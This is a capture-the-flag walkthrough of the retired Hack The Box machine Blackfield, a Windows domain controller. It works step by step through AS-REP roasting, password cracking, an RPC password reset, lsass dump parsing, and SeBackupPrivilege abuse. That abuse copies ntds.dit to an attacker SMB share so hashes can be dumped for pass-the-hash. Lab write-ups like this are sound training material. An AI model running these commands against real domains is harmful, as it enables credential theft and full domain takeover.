Blackfield: A Walkthrough by Mursalin
====================================

Blackfield is a challenging Windows Active Directory box from Hack The Box. The path involves unauthenticated AS‑REP roasting, bloodhound‑based privilege discovery, a password reset over RPC, mining a process dump for an `lsass.exe` memory image, and finally abusing `SeBackupPrivilege` to extract the NTDS.dit database. In Beyond Root I’ll dig into the EFS encryption that prevented a straightforward read of root.txt and explore a Windows session quirk that made `cipher.exe` behave oddly.

Box Info
--------

| Field        | Value |
|--------------|-------|
| Name         | Blackfield |
| OS           | Windows |
| Difficulty   | Hard |
| Release      | 06 Jun 2020 |
| Retire       | 03 Oct 2020 |
| User blood   | 00:31:13 (original: cube0x0) |
| Root blood   | 00:59:23 (original: cube0x0) |
| Creator      | aas |

Recon
-----

### Nmap

A fast full‑port TCP scan revealed eight open services:

```bash
mursalin@kali$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.122
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 15:29 EDT
Nmap scan report for 10.10.10.122
Host is up (0.073s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman
```

A script and version scan on those ports gave more context:

```bash
mursalin@kali$ nmap -p 53,88,135,389,445,593,3268,5985 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.122
...
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: ...)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

UDP scanning added two more open ports:

```bash
mursalin@kali$ nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.122
...
53/udp   open  domain
389/udp  open  ldap
```

The combination screams Domain Controller. The LDAP banner confirms the domain `BLACKFIELD.local`.

### DNS (TCP/UDP 53)

Whenever DNS runs on TCP, I try a zone transfer. It failed, but simple queries worked for the parent domain and for automatically discovered subdomains like `ForestDnsZones.BLACKFIELD.local` and `DomainDnsZones.BLACKFIELD.local`. No further low‑hanging fruit here.

### LDAP (TCP 389/3268)

Anonymous `ldapsearch` returned the naming contexts:

```bash
mursalin@kali$ ldapsearch -h 10.10.10.122 -x -s base namingcontexts
...
namingcontexts: DC=BLACKFIELD,DC=local
namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
```

Attempting a subtree search without credentials gave an “Operations error” – we’ll need valid bind credentials for deeper LDAP queries.

### SMB (TCP 445)

`crackmapexec` identified the host as DC01 running Windows 10 Build 17763. A null session allowed listing shares:

```bash
mursalin@kali$ smbmap -H 10.10.10.122 -u null
[+] Guest session       IP: 10.10.10.122:445
    Disk         Permissions     Comment
    ----         -----------     -------
    ADMIN$       NO ACCESS       Remote Admin
    C$           NO ACCESS       Default share
    forensic     NO ACCESS       Forensic / Audit share.
    IPC$         READ ONLY       Remote IPC
    NETLOGON     NO ACCESS       Logon server share
    profiles$    READ ONLY
    SYSVOL       NO ACCESS       Logon server share
```

The `profiles$` share was readable; I connected with `smbclient -N` and saw hundreds of user‑named folders, all empty. I mounted the share locally and extracted the directory names into a user list:

```bash
mursalin@kali$ mount -t cifs //10.10.10.122/profiles$ /mnt
Password for root@//10.10.10.122/profiles$:  # just press Enter
mursalin@kali$ ls -1 /mnt/ > users
```

This list became the foundation for AS‑REP roasting.

AS‑REP Roasting → User `support`
-------------------------------

Using the `users` file, I looped over every name with `GetNPUsers.py` and grepped for `krb5asrep` to spot any account with `UF_DONT_REQUIRE_PREAUTH`:

```bash
mursalin@kali$ for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.122 blackfield.local/$user | grep krb5asrep; done
$krb5asrep$23$support@BLACKFIELD.LOCAL:83f252224f04becb3108d7234f0fcd94$0f355b4a...<snip>
```

Only `support` popped. I saved the hash and cracked it with `hashcat` mode 18200 and `rockyou.txt`:

```bash
mursalin@kali$ hashcat -m 18200 svc.asrep.hash /usr/share/wordlists/rockyou.txt --force
...
$krb5asrep$23$support@BLACKFIELD.LOCAL:...:#00^BlackKnight
```

Credentials: `support : #00^BlackKnight`

BloodHound & Privilege Discovery
--------------------------------

I used `bloodhound-python` (Python 2 version) to collect all data from the domain:

```bash
mursalin@kali$ bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.122
```

The resulting JSON files were loaded into BloodHound. Searching for the `support` node revealed a **First Degree Object Control**: `ForceChangePassword` over the user `AUDIT2020`.

Resetting `audit2020` Password via RPC
--------------------------------------

I used `rpcclient` to reset the password, choosing something complex that meets policy (e.g., `Mursalin123!`):

```bash
mursalin@kali$ rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.122
rpcclient $> setuserinfo2 audit2020 23 'Mursalin123!'
```

No output means success. From the command line it would be:

```bash
mursalin@kali$ rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.122 -c 'setuserinfo2 audit2020 23 "Mursalin123!"'
```

Now `audit2020` can authenticate over SMB, but not WinRM.

The `forensic` Share – Memory Dumps
-----------------------------------

With the new credentials, `smbmap` revealed an extra share, `forensic`, which was previously hidden:

```bash
mursalin@kali$ smbmap -H 10.10.10.122 -u audit2020 -p 'Mursalin123!'
[+] IP: 10.10.10.122:445        Name: ...
    Disk         Permissions     Comment
    ----         -----------     -------
    ...
    forensic     READ ONLY       Forensic / Audit share.
```

Inside were three folders: `commands_output`, `tools`, and `memory_analysis`. The `memory_analysis` directory contained several ZIP files, each named after a process. The one that caught my eye was `lsass.zip`. I downloaded and extracted it:

```bash
mursalin@kali$ unzip lsass.zip
  inflating: lsass.DMP
mursalin@kali$ file lsass.DMP
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, ...
```

Using `pypykatz` (installed via `pip3 install pypykatz`) I parsed the minidump:

```bash
mursalin@kali$ pypykatz lsa minidump lsass.DMP
...
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
...
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                NT: 9658d1d1dcd9250115e2205d9f48400d
...
```

Now I have the NTLM hash for `svc_backup`.

WinRM Shell as `svc_backup`
----------------------------

`crackmapexec` confirmed that the hash works for WinRM:

```bash
mursalin@kali$ crackmapexec winrm 10.10.10.122 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
WINRM  10.10.10.122 5985  DC01  [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

I used `evil-winrm` to obtain a shell and grabbed the user flag:

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\desktop> cat user.txt
0b81b5d1************************
```

Privilege Escalation – Abusing `SeBackupPrivilege`
--------------------------------------------------

Checking privileges showed `SeBackupPrivilege` enabled:

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\desktop> whoami /priv
...
SeBackupPrivilege             Back up files and directories  Enabled
```

This comes from membership in the **Backup Operators** group. I uploaded the `SeBackupPrivilegeCmdLets.dll` and `SeBackupPrivilegeUtils.dll` from the [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) repository and imported them:

```powershell
*Evil-WinRM* PS C:\programdata> upload /opt/SeBackupPrivilege/.../SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\programdata> upload /opt/SeBackupPrivilege/.../SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeUtils.dll
```

Now I could copy files that would normally be off‑limits, but `ntds.dit` couldn’t be read directly because it’s locked by the system.

### Creating a Shadow Copy with `diskshadow`

I wrote a small script `vss.dsh` to mount a VSS snapshot as the `Z:` drive:

```plaintext
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```

On Kali I converted it to DOS line endings with `unix2dos`, uploaded, and ran it:

```powershell
*Evil-WinRM* PS C:\windows\system32> diskshadow /s c:\programdata\vss.dsh
...
-> expose %df% z:
The shadow copy was successfully exposed as z:\.
```

Beforehand I started an SMB server on my Kali box (`smbserver.py s . -smb2support -username df -password df`) and mapped it:

```powershell
*Evil-WinRM* PS C:\programdata> net use \\10.10.14.14\s /u:df df
```

Then copied the locked `ntds.dit` and the SYSTEM registry hive:

```powershell
*Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.14\s\ntds.dit
*Evil-WinRM* PS C:\programdata> reg.exe save hklm\system \\10.10.14.14\system
```

After a cleanup script to remove the shadow copy, I had both files on my attacker machine.

### Dumping Domain Hashes

`secretsdump.py` extracted every hash from `ntds.dit`:

```bash
mursalin@kali$ secretsdump.py -system system -ntds ntds.dit LOCAL
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
...
```

Finally, a WinRM session as Administrator:

```bash
mursalin@kali$ evil-winrm -i 10.10.10.122 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
4375a629************************
```

Beyond Root – EFS & Session Shenanigans
-----------------------------------------

I wanted to understand why `Copy-FileSeBackupPrivilege` couldn’t read `root.txt` directly. The ACLs looked normal, but the file had the `E` attribute – it was encrypted with EFS. The `cipher /c` command, however, returned “Access is denied” even when run as the local Administrator over WinRM.

The answer lay in Windows sessions. WinRM processes run in **Session 0**, whereas the interactive console (and the EFS private keys) are bound to **Session 1**. Only processes running in the user’s logon session can decrypt EFS files. To prove this, I used a Meterpreter shell, migrated into a Session‑1 process owned by `Administrator` (e.g., a `svchost.exe`), and then `cipher /c` worked perfectly, revealing the certificate thumbprint and allowing decryption.

Additionally, a scheduled task named **Watcher** ran `watcher.ps1` at startup. This script monitored `root.txt` for changes (flag rotations), and whenever the file was modified, it would automatically re‑encrypt it using the administrator’s EFS key. That’s why a freshly rotated flag is always encrypted – a nice touch from the box creator.

---

That concludes the journey through Blackfield. It was a fantastic blend of Active Directory attacks, forensic analysis, and Windows internals. I hope this walkthrough helps you in your own hacking endeavors!

~ Mursalin
